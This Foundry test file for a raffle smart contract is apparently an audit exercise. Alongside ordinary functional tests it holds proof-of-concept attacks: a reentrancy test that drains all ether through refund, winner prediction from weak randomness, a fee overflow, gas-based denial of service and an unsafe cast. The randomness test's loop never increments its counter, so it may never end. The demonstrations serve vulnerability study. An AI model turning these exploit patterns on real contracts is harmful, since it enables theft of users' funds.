// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {ReentrancyAttack} from "./ReentrancyAttack.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    ReentrancyAttack reentrancyAttack;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    //////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    function test_denialOfService() public {
        uint256 gasStartA = gasleft();
        address[] memory players = new address[](1);
        players[0] = playerOne;
        // @segon Not needed prank here
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        uint256 gasCostA = gasStartA - gasleft();

        uint256 gasStartB = gasleft();
        players[0] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        uint256 gasCostB = gasStartB - gasleft();

        uint256 gasStartC = gasleft();
        players[0] = playerThree;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        uint256 gasCostC = gasStartC - gasleft();

        uint256 gasStartD = gasleft();
        players[0] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        uint256 gasCostD = gasStartD - gasleft();

        for (uint256 i = 5; i < 100; i++) {
            players[0] = address(i);
            puppyRaffle.enterRaffle{value: entranceFee}(players);
        }

        uint256 gasStartX = gasleft();
        players[0] = address(100);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        uint256 gasCostX = gasStartX - gasleft();

        console.log("gasCostA is: %s", gasCostA);
        console.log("gasCostB is: %s", gasCostB);
        console.log("gasCostC is: %s", gasCostC);
        console.log("gasCostD is: %s", gasCostD);
        console.log("gasCostX is: %s", gasCostX);
    }

    function test_reentrancyRefund() public {
        // player 1,2,3 Store in Ether, then attack contract deposit in Ether and Reentrancy attack and pick up the contract all Ether!
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        assert(address(puppyRaffle).balance == 3 ether);

        reentrancyAttack = new ReentrancyAttack(address(puppyRaffle));
        address[] memory attack = new address[](1);
        attack[0] = address(reentrancyAttack);
        puppyRaffle.enterRaffle{value: entranceFee}(attack);
        assert(address(puppyRaffle).balance == 4 ether);

        reentrancyAttack.attack();
        assert(address(puppyRaffle).balance == 0 ether);
        assert(address(reentrancyAttack).balance == 4 ether);
    }

    function test_randomnessDueToPredictableWinner() public playersEntered {
        address attacker = makeAddr("attacker");
        address[] memory player = new address[](1);
        player[0] = attacker;
        puppyRaffle.enterRaffle{value: entranceFee}(player);
        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration() + 1);
        vm.roll(block.number + 1);

        uint256 i = 1;
        while (true) {
            // address[] memory players = puppyRaffle.players;
            uint256 winnerIndex =
                uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 5;
            address winner = puppyRaffle.players(winnerIndex);
            if (winner == attacker) {
                break;
            }
            // if no change block.timestamp, result will not change, here we simulate the passage of time of reality and blockchain
            vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration() + i);
        }
        puppyRaffle.selectWinner();
        assert(puppyRaffle.previousWinner() == attacker);
    }

    function test_overflow() public playersEntered {
        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration() + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        console.log("The first raffle has four players, and totalFees is", puppyRaffle.totalFees());

        address[] memory players = new address[](89);
        for (uint256 i = 0; i < 89; i++) {
            players[i] = address(i + 1);
        }
        puppyRaffle.enterRaffle{value: puppyRaffle.entranceFee() * players.length}(players);
        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration() + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        console.log("The second raffle has eighty-nine players, and totalFees is", puppyRaffle.totalFees());

        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function test_unsafeCast() public view {
        uint256 fee = 20000000000000000000;
        console.log("uint64(fee) = ", uint64(fee));
    }
}
